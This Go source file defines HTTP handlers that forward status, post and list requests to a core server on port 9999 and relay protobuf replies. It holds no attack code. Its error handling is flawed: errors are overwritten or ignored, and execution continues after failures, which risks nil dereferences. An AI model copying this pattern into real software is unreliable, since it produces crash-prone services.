package main

import (
	"bytes"
	"fmt"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"io/ioutil"
	"log"
	"net/http"
)

func status(w http.ResponseWriter, r *http.Request) {
	resp, err := http.Get("http://" + CORESERVER + ":9999/status")
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Fprintf(w, string(stat.GetDesc()))
}

func forwardReq(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		resp := &mcs.MCS{
			Status: 500,
		}
		rdata, _ := proto.Marshal(resp)
		w.Write(rdata)
	}
	url := "http://" + CORESERVER + ":9999" + string(r.URL.Path)
	resp, err := http.Post(url, "", bytes.NewBuffer(data))
	if err != nil {
		resp := &mcs.MCS{
			Status: 500,
		}
		rdata, _ := proto.Marshal(resp)
		w.Write(rdata)
	}
	rdata, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		resp := &mcs.MCS{
			Status: 500,
		}
		rdata, _ := proto.Marshal(resp)
		w.Write(rdata)
	}
	w.Write(rdata)
}

func listForward(w http.ResponseWriter, r *http.Request) {
	url := "http://" + CORESERVER + ":9999" + string(r.URL.Path)
	resp, err := http.Get(url)
	if err != nil {
		resp := &mcs.MCS{
			Status: 500,
		}
		rdata, _ := proto.Marshal(resp)
		w.Write(rdata)
	}
	rdata, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		resp := &mcs.MCS{
			Status: 500,
		}
		rdata, _ := proto.Marshal(resp)
		w.Write(rdata)
	}
	w.Write(rdata)
}
